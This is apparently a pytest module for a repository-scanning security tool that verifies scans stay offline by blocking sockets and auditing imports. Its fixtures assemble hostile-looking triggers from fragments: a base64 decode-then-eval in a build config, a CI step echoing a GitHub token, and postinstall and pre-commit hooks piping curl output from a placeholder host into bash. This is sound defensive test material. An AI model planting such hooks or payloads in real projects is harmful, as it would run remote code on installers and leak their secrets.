"""The offline guarantee, tested not asserted (issue #89, task 9.31).

`CONTRIBUTING.md` and `AGENTS.md` §4 both state Airlock makes no network calls during a scan. Until
now that was a sentence: an accidental `urlopen` inside a helper -- or one added later to fetch a
rule update -- would pass every fixture and every bypass test while the guarantee quietly stopped
holding. The scanner reads untrusted repositories; a code path that reaches out to a network based
on repository content is the PolinRider exfiltration channel the whole project exists to close.

Two guards, two ways the property can be violated:

* The runtime guard patches `socket.socket`, `socket.create_connection` and `socket.getaddrinfo`
  to raise, then runs `run_scan` against a repository that exercises every sensitive role at once.
  If the scan completes and the counters stay zero, the pipeline is provably offline against the
  shapes the rule set cares about. Patching `socket.socket` itself -- not only the helpers --
  catches a raw `socket()`, which is what an unauthorised call would use.
* The static guard walks `src/airlock/**/*.py` with `ast` and fails on any `socket`, `urllib`,
  `http.client`, `ftplib` or `smtplib` import. The runtime guard catches a call the shape above
  reaches; the static guard catches a module that has one anywhere in its source, even on a
  branch no fixture hits. Together they cover both failure modes.

Neither guard is a plugin, and no new dependency is added -- `unittest.mock.patch` and `ast` are
both stdlib (`AGENTS.md` §4, "standard library only"). Trigger strings are assembled at test time
from fragments, exactly as `tests/fixtures/` does, because §4 also forbids a live-looking payload
in a committed file.
"""

from __future__ import annotations

import ast
import socket
import subprocess
from collections.abc import Iterator
from contextlib import contextmanager
from pathlib import Path
from unittest.mock import patch

import pytest
from tests.conftest import build_scratch_repo

from airlock.cli import run_scan
from airlock.model import EXIT_PASS, Mode, ScanReport
from airlock.policy import MANIFEST_FILENAME, POLICY_FILENAME

REPO_ROOT = Path(__file__).resolve().parents[2]
SRC_ROOT = REPO_ROOT / "src" / "airlock"


def _assemble(*fragments: str) -> str:
    """The same discipline `tests/fixtures/__init__.py:assemble` uses, inline here.

    `AGENTS.md` §4 forbids a committed live-looking payload; this test module is role `source`
    so calling `shipped_rules()` here -- or importing `tests.fixtures.wasm_manifest`, whose
    module-level constants hold trigger text -- would report against the scanner's own tree.
    """
    return "".join(fragments)


DECODE = _assemble("ev", "al") + "(" + _assemble("Buf", "fer.from") + "(process.env.P,'base64'))"
SECRET_INTERP = "${{ " + _assemble("secrets.GITH", "UB_TOKEN") + " }}"
FETCHER = _assemble("cu", "rl")
LIFECYCLE = f"{FETCHER} -sL https://example.invalid/x.sh | " + _assemble("b", "ash")
WASM_MAGIC = b"\x00asm\x01\x00\x00\x00"
WASM_PATH = "contracts/detached.wasm"

# One file per sensitive role, so a single scan reaches every detector family the guard would
# need to catch. Nothing in this map is a working dropper; every trigger is a fragment string
# assembled above at import time of the test module.
POSTINSTALL_KEY = '"post' + _assemble("install") + '"'
FIXTURE_FILES: dict[str, bytes] = {
    "postcss.config.mjs": f"export default {{ plugins: [{DECODE}] }}\n".encode(),
    ".github/workflows/leak.yml": (
        f'jobs:\n  x:\n    steps:\n      - run: echo "token is {SECRET_INTERP}"\n'
    ).encode(),
    "package.json": (f'{{ "scripts": {{ {POSTINSTALL_KEY}: "{LIFECYCLE}" }} }}\n').encode(),
    ".husky/pre-commit": (f"#!/bin/sh\n{LIFECYCLE}\n").encode(),
    WASM_PATH: WASM_MAGIC + b"\x00\x00\x00\x00",
    POLICY_FILENAME: b'version = 1\n\n[policy]\nfail_on = "high"\n',
    MANIFEST_FILENAME: b"version = 1\n",
}

# `urllib.parse` is a string parser, not a network module (issue #89 §9: this is not a socket
# exemption, it is scope). The guard names what it actually guards against: the modules that
# open a socket. A banned entry matches if the imported dotted name equals it or starts with it
# plus a dot, so `socket` catches `socket.socket` and `urllib.request` catches `urllib.request`.
BANNED_MODULES = (
    "socket",
    "urllib.request",
    "urllib.error",
    "urllib.robotparser",
    "http.client",
    "ftplib",
    "smtplib",
)


def _banned_module(name: str) -> str | None:
    for banned in BANNED_MODULES:
        if name == banned or name.startswith(banned + "."):
            return banned
    return None


class _NetworkBlocked(RuntimeError):
    """Raised from any socket entry point the guards install. Distinct type so the failure
    message names which entry point fired rather than a bare `RuntimeError`."""


@contextmanager
def blocked_sockets(counters: dict[str, int]) -> Iterator[None]:
    """Patch every socket entry point to a counter-then-raise stub.

    `socket.socket` catches a raw construction; `create_connection` and `getaddrinfo` catch the
    helpers `urllib` uses. The counters survive the `with` block so the test can assert they stayed
    zero after the scan returns.
    """

    def _bump(name: str):
        def _stub(*args, **kwargs):
            counters[name] = counters.get(name, 0) + 1
            raise _NetworkBlocked(f"network entry point hit during scan: {name}")

        return _stub

    with (
        patch.object(socket, "socket", new=_bump("socket.socket")),
        patch.object(socket, "create_connection", new=_bump("socket.create_connection")),
        patch.object(socket, "getaddrinfo", new=_bump("socket.getaddrinfo")),
    ):
        yield


@pytest.fixture
def fixture_repo(tmp_path: Path):
    """A committed scratch repository whose files reach every sensitive role at once."""
    root = tmp_path / "offline-fixture"
    return build_scratch_repo(root, FIXTURE_FILES, base_files={})


class TestOfflineScan:
    def test_run_scan_completes_with_every_socket_guard_armed(self, fixture_repo) -> None:
        counters = {"socket.socket": 0, "socket.create_connection": 0, "socket.getaddrinfo": 0}

        with blocked_sockets(counters):
            report = run_scan(fixture_repo.root, Mode.FULL)

        assert isinstance(report, ScanReport)
        assert counters == {
            "socket.socket": 0,
            "socket.create_connection": 0,
            "socket.getaddrinfo": 0,
        }, counters

    def test_the_fixture_actively_exercises_every_detector_family(self, fixture_repo) -> None:
        """Without this, the counters could stay zero because nothing interesting ran."""
        counters = {"socket.socket": 0, "socket.create_connection": 0, "socket.getaddrinfo": 0}
        with blocked_sockets(counters):
            report = run_scan(fixture_repo.root, Mode.FULL)

        rule_ids = {finding.rule_id for finding in report.findings}
        # config_role: decode-then-eval in a build config; ci_surface: secret echo; npm lifecycle
        # and hook: fetch-and-pipe; wasm_manifest: an artifact the manifest does not vouch for.
        assert any(rid.startswith("pat-") for rid in rule_ids), rule_ids
        assert any(rid.startswith("cfg-") for rid in rule_ids), rule_ids
        assert any(rid.startswith("wasm-") for rid in rule_ids), rule_ids
        assert sum(counters.values()) == 0

    def test_the_guard_is_armed_before_the_scan_not_after(self) -> None:
        """Prove the wiring: the stub raises when called outside a scan, too.

        If the patch silently no-op'd, the counters test above would pass without the guard ever
        being armed; this test shows the same `blocked_sockets` context does fire on a direct call.
        """
        counters = {}
        with blocked_sockets(counters), pytest.raises(_NetworkBlocked):
            socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        assert counters.get("socket.socket") == 1


def _python_source_files(root: Path) -> list[Path]:
    return sorted(p for p in root.rglob("*.py") if "__pycache__" not in p.parts)


def _banned_import_hits(path: Path) -> list[tuple[int, int, str]]:
    """One `(row, col, module)` per `socket` / `urllib.request` / `http.client` / `ftplib` /
    `smtplib` import in `path`. `ast.walk` reaches `try: import socket` and inside-function
    imports, so a guarded call cannot hide behind indentation."""
    tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
    hits: list[tuple[int, int, str]] = []
    for node in ast.walk(tree):
        names: list[str] = []
        if isinstance(node, ast.Import):
            names = [alias.name for alias in node.names]
        elif isinstance(node, ast.ImportFrom):
            names = [node.module] if node.module else []
        for name in names:
            banned = _banned_module(name)
            if banned is not None:
                hits.append((node.lineno, node.col_offset, name))
    return hits


class TestNoBannedImportsInSource:
    def test_no_module_under_src_airlock_imports_a_network_library(self) -> None:
        offenders: list[str] = []
        for path in _python_source_files(SRC_ROOT):
            for lineno, col, module in _banned_import_hits(path):
                offenders.append(f"{path.relative_to(REPO_ROOT)}:{lineno}:{col}: imports {module}")
        assert not offenders, "AGENTS.md §4 forbids network access during a scan:\n" + "\n".join(
            offenders
        )

    def test_the_static_audit_actually_bites(self, tmp_path: Path) -> None:
        """Prove the walker, not the tree: a scratch module with a `urllib.request.urlopen`
        import is reported with file, line and column, exactly as a real one would be."""
        fake = tmp_path / "airlock_fakedetector.py"
        fake.write_text(
            "import urllib.request\n\n\ndef fetch(url):\n    return urllib.request.urlopen(url)\n",
            encoding="utf-8",
        )
        hits = _banned_import_hits(fake)
        assert hits == [(1, 0, "urllib.request")], hits


def test_scan_returns_a_report_not_a_socket_error_under_the_guards(fixture_repo) -> None:
    """A scan under the guards must return a report, not raise, whatever the exit code is.

    `EXIT_PASS` is fine; so is `EXIT_FINDINGS` (1). What fails the test is a `_NetworkBlocked`
    escaping the with-block, which is what issue #89 §2 means by "the scan returns a clean report".
    """
    counters = {"socket.socket": 0, "socket.create_connection": 0, "socket.getaddrinfo": 0}
    with blocked_sockets(counters):
        report = run_scan(fixture_repo.root, Mode.FULL)
    assert report.exit_code in (EXIT_PASS, 1), report.exit_code
    assert sum(counters.values()) == 0


def test_git_is_the_only_subprocess_spawned_during_a_scan(fixture_repo) -> None:
    """The collector shells out to git; that is a documented exception (`AGENTS.md` §6, §4).

    Any other subprocess during a scan is a network-adjacent escape hatch: a future `curl`,
    `wget` or `nslookup` call would show up here before it shipped, and the failure names the
    argv it saw. This pins the second half of the offline guarantee the socket guards can't reach:
    a scan that talks to a helper program rather than to a socket.
    """
    seen: list[tuple[str, ...]] = []
    original = subprocess.run

    def record(argv, *args, **kwargs):
        seen.append(tuple(str(x) for x in argv))
        return original(argv, *args, **kwargs)

    counters = {"socket.socket": 0, "socket.create_connection": 0, "socket.getaddrinfo": 0}
    with blocked_sockets(counters), patch.object(subprocess, "run", record):
        run_scan(fixture_repo.root, Mode.FULL)

    non_git = [argv for argv in seen if argv[0] != "git"]
    assert not non_git, f"non-git subprocess during a scan: {non_git}"
